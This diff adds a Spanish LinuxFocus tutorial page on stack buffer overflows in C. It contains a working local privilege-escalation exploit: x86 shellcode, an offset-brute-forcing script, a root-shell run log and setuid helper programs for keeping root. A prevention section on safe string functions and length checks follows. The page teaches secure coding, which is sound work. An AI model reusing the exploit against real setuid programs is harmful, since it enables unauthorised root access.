@@ -1,0 +1,921 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//ES">
+<HTML>
+<HEAD>
+ <META http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+ <META NAME="GENERATOR" CONTENT="lfparser_2.9">
+ <META NAME="LFCATEGORY" CONTENT="Software Development">
+ <TITLE>lf190, Software Development: Evitando agujeros de seguridad durante el desarrollo de aplicaciones - 3ª Parte : desbordamiento de b&uacute;fer</TITLE>
+<!-- stylesheet added by lfparser: --> 
+<style type="text/css">
+<!--
+ pre { font-familiy:monospace,Courier }
+-->
+</style>
+ 
+</HEAD>
+<BODY bgcolor="#ffffff" text="#000000">
+ <!-- this is generated html code. NEVER use this file for your
+ translation work. Instead get the file with the same article number
+ and .meta.shtml in its name. Translate this meta file and then
+ use lfparser program to generate the final article -->
+ <!-- lfparser can be obtained from http://main.linuxfocus.org/~guido/dev/lfparser.html -->
+
+<!-- 2pdaIgnoreStart -->
+<MAP name="top">
+  <AREA shape="rect" coords="367,9,418,30" alt="Hogar" href="../">
+  <AREA shape="rect" coords="423,9,457,30" alt="Mapa" href="../map.html">
+  <AREA shape="rect" coords="463,9,508,30" alt="Indice" href="../indice.html">
+  <AREA shape="rect" coords="514,9,558,30" alt="Busqueda" href="../Search/">
+</MAP>
+<MAP name="bottom">
+  <AREA shape="rect" coords="78,0,163,15" alt="Noticias" href="../News/">
+  <AREA shape="rect" coords="189,0,284,15" alt="Arca" href="../Archives/">
+  <AREA shape="rect" coords="319,0,395,15" alt="Enlaces" href="../Links/">
+  <AREA shape="rect" coords="436,0,523,15" alt="Sobre LF" href="../aboutus.html">
+</MAP>
+<!-- IMAGE HEADER -->
+<CENTER>
+  <IMG src="../../common/images/Topbar-es.gif" width="600" height="40" border="0" alt="[Top bar]" ismap usemap="#top" ><BR>
+  <IMG src="../../common/images/Bottombar-es.gif" width="600" height="21" border="0" alt="[Bottom bar]" ismap usemap="#bottom">
+</CENTER>
+<!-- SSI_INFO -->
+
+<!--#include virtual="../../dynahead.shtml" -->
+<!-- 2pdaIgnoreStop -->
+
+<!-- SHORT BIO ABOUT THE AUTHOR -->
+<TABLE ALIGN=LEFT BORDER=0 hspace=4 vspace=4 WIDTH="30%" >
+<TR>
+<TD>
+
+<!-- 2pdaIgnoreStart -->
+<!-- PALM DOC -->
+<TABLE BORDER=0 hspace=4 vspace=4> <TR> <TD>
+<font size=1> <img src="../../common/images/2doc.gif" width=34 align=left border=0 height=22 alt="convert to palm"><a href="http://cgi.linuxfocus.org/cgi-bin/2ztxt">Convert to GutenPalm</a><br>or <a href="http://cgi.linuxfocus.org/cgi-bin/2pda">to PalmDoc</a></font>
+</TD> </TR> </TABLE>
+<!-- END PALM DOC -->
+<!-- 2pdaIgnoreStop -->
+<br>
+<IMG src="../../common/images/FredCrisBCrisG.jpg" alt=
+"[image of the authors]" width="200" height="150">
+<BR>por  <A href= "mailto:pappy@users.sourceforge.net,ccb@club-internet.fr,grenier@nef.esiea.fr"> Fr&eacute;d&eacute;ric Raynal, Christophe Blaess, Christophe Grenier</A>
+<BR><BR>
+<I>Sobre el autor:</I><BR>
+<P>Chistophe Blaess es un ingeniero aeron&aacute;utico independiente. Es fan de Linux
+y realiza gran parte de su trabajo sobre este sistema operativo. Coordina la traducci&oacute;n de las
+p&aacute;ginas man publicadas por el <I>Proyecto de Documentaci&oacute;n de Linux (LDP)</I>.<P><P>Christophe Grenier es un estudiante de 5º curso en ESIEA, donde tambi&eacute;n trabaja
+como administrador de sistemas. Es un apasionado de la seguridad inform&aacute;tica.</P><p>Frederic Raynal utiliza Linux desde hace varios a&ntilde;os porque no contamina, utiliza hormonas,
+ MSG ni harina de huesos animales... s&oacute;lo sudor y astucia.</p>
+<BR><i>Contenidos</i>:
+<UL>
+  <LI><A HREF="#lfindex0">Desbordamiento de b&uacute;fer</A></LI>
+  <LI><A HREF="#lfindex1">Posicion en memoria</A></LI>
+  <LI><A HREF="#lfindex2">Programa para lanzar la aplicaci&oacute;n</A></LI>
+  <LI><A HREF="#lfindex3">Problemas de shell(s)</A></LI>
+  <LI><A HREF="#lfindex4">Prevenci&oacute;n</A></LI>
+  <LI><A HREF="#lfindex5">Comprobando &iacute;ndices</A></LI>
+  <LI><A HREF="#lfindex6">Utilizando funciones n </A></LI>
+  <LI><A HREF="#lfindex7">Validar los datos en dos pasos</A></LI>
+  <LI><A HREF="#lfindex8">Utilizar b&uacute;feres din&aacute;micos</A></LI>
+  <LI><A HREF="#lfindex9">Conclusiones</A></LI>
+  <LI><A HREF="#lfindex10">Enlaces</A></LI>
+  <LI><A HREF="http://cgi.linuxfocus.org/cgi-bin/lftalkback?anum=190&lang=es">Formulario de "talkback" para este art&iacute;culo</A></LI>
+</UL>
+
+</TD></TR></TABLE>
+<!-- HEAD OF THE ARTICLE -->
+<H2>Evitando agujeros de seguridad durante el desarrollo de aplicaciones - 3ª Parte : desbordamiento de b&uacute;fer</H2>
+ <IMG src="../../common/images/illustration183.gif" width="100" height=
+"100" alt="[article illustration]" hspace="10">
+<!-- ABSTRACT OF THE ARTICLE -->
+<P><i>Resumen</i>:
+<P>
+
+
+En este art&iacute;culo se introduce un desbordamiento de b&uacute;fer real en una aplicaci&oacute;n.
+Veremos que es un agujero de seguridad f&aacute;cilmente atacable y c&oacute;mo evitarlo.
+Este art&iacute;culo asume que usted ya ha le&iacute;do los dos art&iacute;culos anteriores:
+<ul><li><a href="../January2001/article182.shtml">Evitando agujeros de seguridad en el desarrollo de aplicaciones - 1ª Parte</a><li><a href="../March2001/article183.shtml">Evitando agujeros de seguridad en el desarrollo de aplicaciones - 2ª Parte: memoria, pila y funciones, c&oacute;digo shell</a></ul></P>
+<HR size="2" noshade align="right"><BR>
+<!-- BODY OF THE ARTICLE -->
+
+
+<A NAME="lfindex0">&nbsp;</A>
+<H3>Desbordamiento de b&uacute;fer</H3>
+
+
+<P>En nuestro art&iacute;culo anterior escribimos un peque&ntilde;o programa de unos 50 bytes
+y &eacute;ramos capaces de arrancar una shell o salir en caso de fallo. Ahora debemos insertar
+este c&oacute;digo dentro de la aplicaci&oacute;n que queremos atacar. Esto se hace sobreescribiendo la
+direcci&oacute;n de retorno de una funci&oacute;n y sustituy&eacute;ndola por nuestra direcci&oacute;n del c&oacute;digo de shell.
+Esto se hace forzando el desbordamiento de una variable autom&aacute;tica alojada en la pila de proceso.</P>
+
+<P>Por ejemplo, en el siguiente programa, se copia la cadena dada como primer argumento en la
+l&iacute;nea de comandos a un b&uacute;fer de 500 bytes. Esta copia se realiza sin comprobar si es m&aacute;s grande
+que el tama&ntilde;o del b&uacute;fer. Como veremos, utilizar la funci&oacute;n <CODE>strncpy()</CODE> nos permite
+evitar este problema.</P>
+
+<PRE>
+  /* vulnerable.c */
+
+  #include &lt;string.h&gt;
+
+  int main(int argc, char * argv [])
+  {
+    char buffer [500];
+
+    if (argc &gt; 1)
+    strcpy(buffer, argv[1]);
+    return (0);
+  }
+</PRE>
+
+<P><CODE>buffer</CODE> es una variable autom&aacute;tica, el espacio utilizado por los 500&nbsp;bytes
+es reservado en la pila tan pronto como se arranca el programa. Con un argumento mayor que 500
+bytes, los datos desbordan el b&uacute;fer e "invaden" la pila de proceso. Como ya se ha visto con
+anterioridad, la pila almacena la direcci&oacute;n de la siguiente instrucci&oacute;n a ejecutar (aka <EM>return address</EM>).
+Para explotar este agujero de seguridad, es suficiente reemplazar la direcci&oacute;n de retorno de la
+funci&oacute;n por la direcci&oacute;n del c&oacute;digo de shell que se desea ejecutar. Este c&oacute;digo shell se inserta
+dentro del b&uacute;fer seguido de su direcci&oacute;n de memoria.</P>
+
+<A NAME="lfindex1">&nbsp;</A>
+<H2>Posicion en memoria</H2>
+
+
+<P>Obtener la direcci&oacute;n de memoria del c&oacute;digo shell tiene su truco. Debemos
+descubrir el desplazamiento entre el registro <CODE>%esp</CODE> apuntando a la
+primera posici&oacute;n de la pila y la direcci&oacute;n del c&oacute;digo shell. Para disponer de un
+margen de seguridad, el comienzo del b&uacute;fer se rellena con la instrucci&oacute;n de ensamblador
+<CODE>NOP</CODE>; es una instrucci&oacute;n neutra de un &uacute;nico byte que no tiene ning&uacute;n efecto en
+absoluto. En consecuencia, arrancando puntos de memoria anteriores al verdadero comienzo del
+c&oacute;digo de shell, la CPU ejecuta <CODE>NOP</CODE> tras <CODE>NOP</CODE> hasta que alcanza nuestro
+c&oacute;digo. Para tener m&aacute;s posibilidades, ponemos el c&oacute;digo de la shell en medio del b&uacute;fer, seguido
+de la direcci&oacute;n de comiendo repetida hasta el final y precedido de un bloque <CODE>NOP</CODE>.
+El <A href="#buffer">diagrama 1</A> ilustra todo esto:</P>
+
+
+<CENTER>
+<TABLE width="90%" nosave="">
+<CAPTION align="BOTTOM"><A name="buffer" href="#buffer">Diag. 1</A> :
+buffer especially filled up for the exploit.</CAPTION>
+
+<TR>
+<TD><IMG src="../../common/images/article190/art_03_01.gif" alt=
+"[buffer]"></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+<BR>
+<BR>
+<P>El <A href="#aligne">diagrama 2</A> describe el estado de la pila antes y despu&eacute;s del
+desbordamiento. Esto provoca que toda la informaci&oacute;n guardada (<CODE>%ebp</CODE> guardado,
+<CODE>%eip</CODE> guardado, argumentos,...) se reemplace por la nueva direcci&oacute;n de retorno
+esperada: la direcci&oacute;n de comienzo de la parte del b&uacute;fer donde hemos colocado el shellcode.</P>
+
+<CENTER>
+<TABLE width="80%" border="2" cols="2" nosave="">
+<CAPTION align="BOTTOM"><A name="avt_apr" href="#avt_apr">Diag. 2</A> :
+estado de la pila antes y despu&eacute;s del desbordamiento</CAPTION>
+
+<TR>
+<TD>
+<CENTER><IMG src="../../common/images/article190/pile_bef.gif" alt=
+"pile_bef.gif"></CENTER>
+</TD>
+<TD>
+<CENTER><IMG src="../../common/images/article190/pile_aft.gif" alt=
+"pile_aft.gif"></CENTER>
+</TD>
+</TR>
+
+<TR>
+<TD>
+<CENTER>Antes</CENTER>
+</TD>
+<TD>
+<CENTER>Despu&eacute;s</CENTER>
+</TD>
+</TR>
+</TABLE>
+</CENTER>
+
+<BR>
+<BR>
+
+<P>Sin embargo, existe otro problema relacionado con la alineaci&oacute;n en memoria. Una direcci&oacute;n es
+m&aacute;s larga que 1 byte y por consiguiente se almacena en varios bytes. Esto puede causar que la
+alineaci&oacute;n dentro de la memoria no siempre se ajuste correctamente. Por ensayo y error se encuentra
+el alineamiento correcto. Ya que nuestra CPU utiliza palabras de 4 bytes, la alineaci&oacute;n es 0, 1, 2 o
+3 bytes (ver el <A href="../March2001/article183.shtml">articulo 183</A> sobre organizaci&oacute;n de la
+pila). En el <A href="#aligne">diagrama 3</A>, las partes sombreadas corresponden a los 4 bytes
+escritos. El primer caso donde la direcci&oacute;n de retorno es sobreescrita completamente con la
+alineaci&oacute;n correcta es la &uacute;nica que funcionar&aacute;. Los otros conducen a errores de
+<CODE>violaci&oacute;n de segmento</CODE> o <CODE>instrucci&oacute;n ilegal</CODE>. Esta forma emp&iacute;rica de
+encontrar funciona desde que la potencia de los ordenadores actuales permiten realizar este testeo.</P>
+
+<CENTER>
+<TABLE width="90%" nosave="">
+<CAPTION align="BOTTOM"><A name="aligne" href="#aligne">Diag. 3</A> :
+possible alignment with 4 bytes words</CAPTION>
+
+<TR>
+<TD><IMG src="../../common/images/article190/align-en.png" alt=
+"[align]"></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+<A NAME="lfindex2">&nbsp;</A>
+<H2>Programa para lanzar la aplicaci&oacute;n</H2>
+
+
+
+<P>Vamos a escribir un peque&ntilde;o programa para lanzar una aplicaci&oacute;n vulnerable escribiendo datos
+que desborden la pila. Este programa tiene varias opciones para posicionar el c&oacute;digo de shell en
+memoria y as&iacute; elegir que programa ejecutar. Esta versi&oacute;n, inspirada por el art&iacute;culo de Aleph One
+del n&uacute;mero 49 de la revista <EM>phrack</EM>, est&aacute; disponible en el website de Christophe Grenier.</P>
+
+<P>&iquest;C&oacute;mo enviamos nuestro b&uacute;fer preparado a la aplicaci&oacute;n de destino?
+Normalmente, se puede utilizar un par&aacute;metro de l&iacute;nea de comandos como el de <CODE>vulnerable.c</CODE>
+o una variable de entorno. El desbordamiento tambi&eacute;n se puede provocar tecleando en los datos o
+simplemente ley&eacute;ndolo desde un fichero.</P>
+
+<P>El programa <CODE>generic_exploit.c</CODE> arranca reservando el tama&ntilde;o correcto de b&uacute;fer,
+despu&eacute;s copia ah&iacute; el shellcode y lo rellena con las direcciones y c&oacute;digos NOP como se explica
+anteriormente. Entonces prepara un array de argumentos y ejecuta la aplicaci&oacute;n utilizando la
+instrucci&oacute;n <CODE>execve()</CODE>, esta &uacute;ltima sustituyendo al proceso actual por el invocado. El
+programa <CODE>generic_exploit</CODE> necesita el tama&ntilde;o del b&uacute;fer a explotar (un poco mayor que
+su tama&ntilde;o para ser capaz de sobreescribir la direcci&oacute;n de retorno), el offset en memoria y la
+alineaci&oacute;n. Nosotros indicamos si el b&uacute;fer es pasado como una variable de entorno (<CODE>var</CODE>)
+o desde la l&iacute;nea de comandos (<CODE>novar</CODE>). El argumento <CODE>force/noforce</CODE>
+determina si la llamada ejecuta la funci&oacute;n <CODE>setuid()/setgid()</CODE> desde el c&oacute;digo de shell.</P>
+
+<PRE>
+<small>
+/* generic_exploit.c */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/stat.h&gt;
+#define NOP                     0x90
+
+char shellcode[] =
+        "\xeb\x1f\x5e\x89\x76\xff\x31\xc0\x88\x46\xff\x89\x46\xff\xb0\x0b"
+        "\x89\xf3\x8d\x4e\xff\x8d\x56\xff\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff";
+
+unsigned long get_sp(void)
+{
+   __asm__("movl %esp,%eax");
+}
+
+#define A_BSIZE     1
+#define A_OFFSET    2
+#define A_ALIGN     3
+#define A_VAR       4
+#define A_FORCE     5
+#define A_PROG2RUN  6
+#define A_TARGET    7
+#define A_ARG       8
+
+int main(int argc, char *argv[])
+{
+   char *buff, *ptr;
+   char **args;
+   long addr;
+   int offset, bsize;
+   int i,j,n;
+   struct stat stat_struct;
+   int align;
+   if(argc &lt; A_ARG)
+   {
+      printf("USAGE: %s bsize offset align (var / novar)
+             (force/noforce) prog2run target param\n", argv[0]);
+      return -1;
+   }
+   if(stat(argv[A_TARGET],&amp;stat_struct))
+   {
+     printf("\nCannot stat %s\n", argv[A_TARGET]);
+     return 1;
+   }
+   bsize  = atoi(argv[A_BSIZE]);
+   offset = atoi(argv[A_OFFSET]);
+   align  = atoi(argv[A_ALIGN]);
+
+   if(!(buff = malloc(bsize)))
+   {
+      printf("Can't allocate memory.\n");
+      exit(0);
+   }
+
+   addr = get_sp() + offset;
+   printf("bsize %d, offset %d\n", bsize, offset);
+   printf("Using address: 0lx%lx\n", addr);
+
+   for(i = 0; i &lt; bsize; i+=4) *(long*)(&amp;buff[i]+align) = addr;
+
+   for(i = 0; i &lt; bsize/2; i++) buff[i] = NOP;
+
+   ptr = buff + ((bsize/2) - strlen(shellcode) - strlen(argv[4]));
+   if(strcmp(argv[A_FORCE],"force")==0)
+   {
+     if(S_ISUID&amp;stat_struct.st_mode)
+     {
+       printf("uid %d\n", stat_struct.st_uid);
+       *(ptr++)= 0x31;          /* xorl %eax,%eax   */
+       *(ptr++)= 0xc0;
+       *(ptr++)= 0x31;          /* xorl %ebx,%ebx   */
+       *(ptr++)= 0xdb;
+       if(stat_struct.st_uid &amp; 0xFF)
+       {
+     *(ptr++)= 0xb3;        /* movb $0x??,%bl   */
+     *(ptr++)= stat_struct.st_uid;
+       }
+       if(stat_struct.st_uid &amp; 0xFF00)
+       {
+     *(ptr++)= 0xb7;        /* movb $0x??,%bh   */
+     *(ptr++)= stat_struct.st_uid;
+       }
+       *(ptr++)= 0xb0;          /* movb $0x17,%al   */
+       *(ptr++)= 0x17;
+       *(ptr++)= 0xcd;          /* int $0x80        */
+       *(ptr++)= 0x80;
+     }
+     if(S_ISGID&amp;stat_struct.st_mode)
+     {
+       printf("gid %d\n", stat_struct.st_gid);
+       *(ptr++)= 0x31;          /* xorl %eax,%eax   */
+       *(ptr++)= 0xc0;
+       *(ptr++)= 0x31;          /* xorl %ebx,%ebx   */
+       *(ptr++)= 0xdb;
+       if(stat_struct.st_gid &amp; 0xFF)
+       {
+     *(ptr++)= 0xb3;        /* movb $0x??,%bl   */
+     *(ptr++)= stat_struct.st_gid;
+       }
+       if(stat_struct.st_gid &amp; 0xFF00)
+       {
+     *(ptr++)= 0xb7;        /* movb $0x??,%bh   */
+     *(ptr++)= stat_struct.st_gid;
+       }
+       *(ptr++)= 0xb0;          /* movb $0x2e,%al   */
+       *(ptr++)= 0x2e;
+       *(ptr++)= 0xcd;          /* int $0x80        */
+       *(ptr++)= 0x80;
+     }
+   }
+   /* Patch shellcode */
+   n=strlen(argv[A_PROG2RUN]);
+   shellcode[13] = shellcode[23] = n + 5;
+   shellcode[5] = shellcode[20] = n + 1;
+   shellcode[10] = n;
+   for(i = 0; i &lt; strlen(shellcode); i++) *(ptr++) = shellcode[i];
+   /* Copy prog2run */
+   printf("Shellcode will start %s\n", argv[A_PROG2RUN]);
+   memcpy(ptr,argv[A_PROG2RUN],strlen(argv[A_PROG2RUN]));
+
+   buff[bsize - 1] = '\0';
+
+   args = (char**)malloc(sizeof(char*) * (argc - A_TARGET + 3));
+   j=0;
+   for(i = A_TARGET; i &lt; argc; i++)
+     args[j++] = argv[i];
+   if(strcmp(argv[A_VAR],"novar")==0)
+   {
+     args[j++]=buff;
+     args[j++]=NULL;
+     return execve(args[0],args,NULL);
+   }
+   else
+   {
+     setenv(argv[A_VAR],buff,1);
+     args[j++]=NULL;
+     return execv(args[0],args);
+   }
+}
+</small>
+</PRE>
+<P>Para aprovechar <CODE>vulnerable.c</CODE>, debemos tener un b&uacute;ffer mayor que el que
+espera la aplicaci&oacute;n. Por ejemplo, seleccionamos 600 bytes en lugar de los 500 esperados.
+Se halla el desplazamiento relativo a la parte superior de la pila por medio de sucesivos tests.
+La direcci&oacute;n construida con la instrucci&oacute;n <CODE>addr = get_sp() + offset;</CODE> se utiliza
+para sobreescribir la direcci&oacute;n de retorno, lo conseguir&aacute;n ... &iexcl;con un poco de suerte! La
+operaci&oacute;n se basa en la probabilidad de que el registro <CODE>%esp</CODE> no se mover&aacute; mucho
+mientras se ejecuta el actual proceso y el llamado al final del programa. Pr&aacute;cticamente nada es
+seguro: varios eventos pueden modificar el estado de la pila desde el tiempo de computaci&oacute;n
+hasta que el programa a explotar es llamado. Aqu&iacute;, nosotros logramos activar un desbordamiento
+explotable con un desplazamiento de -1900 bytes. Por supuesto, para completar el experimento,
+el destino <CODE>vulnerable</CODE> debe tener un Ser-UID <EM>root</EM>.</P>
+
+<PRE>
+  $ cc vulnerable.c -o vulnerable
+  $ cc generic_exploit.c -o generic_exploit
+  $ su
+  Password:
+  # chown root.root vulnerable
+  # chmod u+s vulnerable
+  # exit
+  $ ls -l vulnerable
+  -rws--x--x   1 root     root        11732 Dec  5 15:50 vulnerable
+  $ ./generic_exploit 600 -1900 0 novar noforce /bin/sh ./vulnerable
+  bsize 600, offset -1900
+  Using address: 0lxbffffe54
+  Shellcode will start /bin/sh
+  bash# id
+  uid=1000(raynal) gid=100(users) euid=0(root) groups=100(users)
+  bash# exit
+  $ ./generic_exploit 600 -1900 0 novar force /bin/sh /tmp/vulnerable
+  bsize 600, offset -1900
+  Using address: 0lxbffffe64
+  uid 0
+  Shellcode will start /bin/sh
+  bash# id
+  uid=0(root) gid=100(users) groups=100(users)
+  bash# exit
+</PRE>
+
+En el primer caso (<CODE>noforce</CODE>), nuestro <CODE>uid</CODE> no cambia.
+Sin embargo, tenemos un nuevo <CODE>euid</CODE> que nos proporciona todos los
+permisos. En consecuencia, incluso si CODE>vi</CODE> dice mientras edita
+<CODE>/etc/passwd</CODE> que es de s&oacute;lo lectura, a&uacute;n podemos escribir el fichero
+y todos los cambios funcionar&aacute;n: &uacute;nicamente hay que forzar la escritura con
+<CODE>w!</CODE> :) El par&aacute;metro <CODE>force</CODE> permite <CODE>uid=euid=0</CODE>
+desde el principio.
+
+<P>Para encontrar autom&aacute;ticamente los valores de desplazamiento para un desbordamiento
+se puede utilizar el siguiente script de shell:</P>
+
+<PRE>
+ #! /bin/sh
+ # find_exploit.sh
+  BUFFER=600
+  OFFSET=$BUFFER
+  OFFSET_MAX=2000
+  while [ $OFFSET -lt $OFFSET_MAX ] ; do
+    echo "Offset = $OFFSET"
+    ./generic_exploit $BUFFER $OFFSET 0 novar force /bin/sh ./vulnerable
+    OFFSET=$(($OFFSET + 4))
+  done
+</PRE>
+
+En nuestro exploit, no tuvimos en cuenta los posibles problemas de alineaci&oacute;n.
+Entonces, es posible que este ejemplo no les funcione con los mismos valores,
+o no funcione en absoluto debido a la alineaci&oacute;n. (Para aquellos que quieran probarlo
+de todas maneras, el par&aacute;metro de alineaci&oacute;n debe ser cambiado a 1, 2 o 3 (aqu&iacute;, 0).
+Algunos sistemas no aceptan la escritura en &aacute;reas de memoria si no se trata de una palabra
+entera, pero esto no es as&iacute; en Linux.
+
+<A NAME="lfindex3">&nbsp;</A>
+<H2>Problemas de shell(s)</H2>
+
+
+<P>Por desgracia, a veces la shell obtenida no es utilizable porque termina por s&iacute;
+misma o al pulsar una tecla. Nosotros utilizamos otro programa para mantener los
+privilegios que hemos adquirido tan cuidadosamente:</P>
+
+<PRE>
+/* set_run_shell.c */
+#include &lt;unistd.h&gt;
+#include &lt;sys/stat.h&gt;
+
+int main()
+{
+  chown ("/tmp/run_shell", geteuid(), getegid());
+  chmod ("/tmp/run_shell", 06755);
+  return 0;
+}
+</PRE>
+
+<P>Ya que nuestro exploit s&oacute;lo es capaz de realizar una tarea simult&aacute;neamente,
+vamos a transferir los derechos obtenidos a trav&eacute;s del programa <CODE>run_shell</CODE>
+con ayuda del programa <CODE>set_run_shell</CODE>. De esta manera se consigue la shell
+deseada.</P>
+
+<PRE>
+/* run_shell.c */
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+
+int main()
+{
+  setuid(geteuid());
+  setgid(getegid());
+  execl("/tmp/shell","shell","-i",0);
+  exit (0);
+}
+</PRE>
+
+La opci&oacute;n <CODE>-i</CODE> corresponde a <CODE>interactive</CODE>. &iquest;Por qu&eacute; no dar los
+permisos directamente a una shell? Simplemente porque el bit <CODE>s</CODE> no est&aacute;
+disponible para todas las shell. La versiones recientes comprueban que uid sea igual a euid,
+al igual que para gid y egid. En consecuencia, <CODE>bash2</CODE> and <CODE>tcsh</CODE>
+incorporan esta l&iacute;nea de defensa, pero ni <CODE>bash</CODE>, ni CODE>ash</CODE> la tienen. Este
+m&eacute;todo deber&iacute;a ser refinado cuando la partici&oacute;n en la que se coloca <CODE>run_shell</CODE> (aqu&iacute;,
+<CODE>/tmp</CODE>) es montada  <CODE>nosuid</CODE> o  <CODE>noexec</CODE>.
+
+
+<A NAME="lfindex4">&nbsp;</A>
+<H2>Prevenci&oacute;n</H2>
+
+
+
+<P>Ya que tenemos un programa Set-UID con un bug de desbordamiento de buffer y su c&oacute;digo
+fuente, somos capaces de preparar un ataque permitiendo la ejecuci&oacute;n de c&oacute;digo aleatorio
+bajo el ID del propietario del fichero. De todas maneras, nuestro objetivo es evitar
+agujeros de seguridad. Ahora vamos a revisar unas cuantas reglas para prevenir los
+desbordamientos de b&uacute;fer. </P>
+
+<A NAME="lfindex5">&nbsp;</A>
+<H2>Comprobando &iacute;ndices</H2>
+
+
+
+<P>La primera regla a seguir es simplemente cuesti&oacute;n de sentido com&uacute;n: los &iacute;ndices
+utilizados para manipular un array siempre debe ser comprobado cuidadosamente. Un
+bucle "tonto" como: </P>
+
+<PRE>
+  for (i = 0; i &lt;= n; i ++) {
+    table [i] = ...
+</PRE>
+
+Probablemente produce un error por el signo <CODE>&lt;=</CODE> en lugar de
+CODE>&lt;</CODE> ya que se hace un acceso hacia el final del array. Si es sencillo verlo
+en ese bucle, es m&aacute;s complicado con un bucle que utiliza &iacute;ndices en decremento ya que se deber&iacute;an
+asegurar de que no toman valores inferiores a cero. Aparte del caso trivial de
+<CODE>for(i=0; i&lt;n ; i++)</CODE>, deben comprobar el algoritmo varias veces (o incluso pedir
+a alguien m&aacute;s que lo compruebe por usted), especialmente al llegar a los extremos del bucle.
+
+<P>El mismo tipo de problema aparece con las cadenas de caracteres: siempre deben recordar
+a&ntilde;adir un byte adicional para el car&aacute;cter nulo final. Un de los errores m&aacute;s frecuentes en
+principiantes consiste en olvidar el car&aacute;cter de fin de cadena. Peor a&uacute;n, es muy complicado de
+diagnosticar debido a que los imprevisibles alineamientos variables (por ejemplo compilar
+con informaci&oacute;n de debug) pueden ocultar el problema.</P>
+
+<P>No se deben subestimar los &iacute;ndices de un array como amenaza a la seguridad de una aplicaci&oacute;n. Hemos
+visto (ver nº55 de <EM>Phrack</EM>) que un desbordamiento de un &uacute;nico byte es suficiente para
+crear un agujero de seguridad, por ejemplo, insertando c&oacute;digo shell en una variable de entorno.</P>
+
+<PRE>
+  #define BUFFER_SIZE 128
+
+  void foo(void) {
+
+    char buffer[BUFFER_SIZE+1];
+
+    /* end of string */
+    buffer[BUFFER_SIZE] = '\0';
+
+    for (i = 0; i&lt;BUFFER_SIZE; i++)
+      buffer[i] = ...
+  }
+</PRE>
+
+<A NAME="lfindex6">&nbsp;</A>
+<H2>Utilizando funciones n </H2>
+
+
+
+Por convenio, las funciones de la librer&iacute;a est&aacute;ndar de C son conscientes del fin de
+una cadena de caracteres por el byte nulo. Por ejemplo, la funci&oacute;n <CODE>strcpy(3)</CODE>
+copia el contenido de la cadena original en una cadena destino hasta que llega a este byte
+nulo. En algunos casos, este comportamiento se vuelve peligroso; hemos visto que el siguiente
+c&oacute;digo tiene un agujero de seguridad:
+
+<PRE>
+  #define LG_IDENT 128
+
+  int fonction (const char * name)
+  {
+    char identity [LG_IDENT];
+    strcpy (identity, name);
+    ...
+  }
+</PRE>
+
+Funciones que limitan la longitud de la copia evitan este problema. Estas funciones tienen una
+`<CODE>n</CODE>' en la mitad de su nombre, por ejemplo, <CODE>strncpy(3)</CODE> en sustituci&oacute;n
+a <CODE>strcpy(3)</CODE>, <CODE>strncat(3)</CODE> por <CODE>strcat(3)</CODE> o
+incluso <CODE>strnlen(3)</CODE> por <CODE>strlen(3)</CODE>.
+
+<P>Sin embargo, se debe tener precauciones con la limitaci&oacute;n <CODE>strncpy(3)</CODE>
+ya que genera efectos colaterales: cuando la cadena origen es m&aacute;s corta que la de destino,
+la copia se completar&aacute; con caracteres nulos hasta el l&iacute;mite <EM>n</EM> y reducir&aacute; la eficiencia
+de la aplicaci&oacute;n. Por otro lado, si la cadena origen es m&aacute;s lasga, se truncar&aacute; y la copia no
+terminar&aacute; en un caracter nulo. Se deber&aacute; a&ntilde;adir manualmente. Teniendo esto en cuenta, la
+rutina anterior se convierte en:</P>
+
+<PRE>
+  #define LG_IDENT 128
+
+  int fonction (const char * name)
+  {
+    char identity [LG_IDENT+1];
+    strncpy (identity, name, LG_IDENT);
+    identity [LG_IDENT] = '\0';
+    ...
+  }
+</PRE>
+
+Naturalmente, los mismos principios se aplican a rutinas que manipulan
+muchos caracteres, por ejemplo, <CODE>wcsncpy(3)</CODE> deber&iacute;a preferirse
+a <CODE>wcscpy(3)</CODE> o <CODE>wcsncat(3)</CODE> a <CODE>wcscat(3)</CODE>.
+Seguramente, el programa se haga m&aacute;s grande pero tambi&eacute;n mejora la seguridad.
+
+<P>Como <CODE>strcpy()</CODE>, <CODE>strcat(3)</CODE> no comprueba el tama&ntilde;o de bufer.
+La funci&oacute;n <CODE>strncat(3)</CODE> a&ntilde;ade un car&aacute;cter al final de la cadena si encuentra
+espacio para hacerlo. Sustituyendo <CODE>strcat(buffer1, buffer2);</CODE> por
+<CODE>strncat(buffer1, buffer2, sizeof(buffer1)-1);</CODE> se elimina el riesgo.</P>
+
+La funci&oacute;n <CODE>sprintf()</CODE> permite formatear datos en una cadena. Tambi&eacute;n tiene una
+versi&oacute;n que puede comprobar el n&uacute;mero de bytes a copiar: <CODE>snprintf()</CODE>. Esta
+funci&oacute;n devuelve el n&uacute;mero de caracteres escritos en una cadena destino (sin tener en cuenta
+el '\0'). Testeando este valor devuelto se sabe si la escritura se ha realizado correctamente:</P>
+
+<PRE>
+  if (snprintf(dst, sizeof(dst) - 1, "%s", src) &gt; sizeof(dst) - 1) {
+    /* Overflow */
+    ...
+  }
+</PRE>
+
+<P>Obviamente, esto no merece la pena cuando el usuario toma el control sobre el n&uacute;mero de
+bytes a copiar. Un agujero similar en BIND (Berkeley Internet Name Daemon) mantuvo ocupados a
+muchos crackers: </P>
+
+<PRE>
+  struct hosten *hp;
+  unsigned long address;
+
+  ...
+
+  /* copy of an address */
+  memcpy(&amp;address, hp-&gt;h_addr_list[0], hp-&gt;h_length);
+  ...
+
+</PRE>
+
+Esto deber&iacute;a copiar siempre 4 bytes. Sin embargo, si usted puede cambiar <CODE>hp-&gt;h_length</CODE>,
+entonces tambi&eacute;n puede modificar la pila. De acuerdo con esto, es obligatorio comprobar la
+longitud de los campos antes de copiar:
+
+<PRE>
+  struct hosten *hp;
+  unsigned long address;
+
+  ...
+
+  /* test */
+  if (hp-&gt;h_length &gt; sizeof(address))
+    return 0;
+
+  /* copy of an address */
+  memcpy(&amp;address, hp-&gt;h_addr_list[0], hp-&gt;h_length);
+  ...
+</PRE>
+
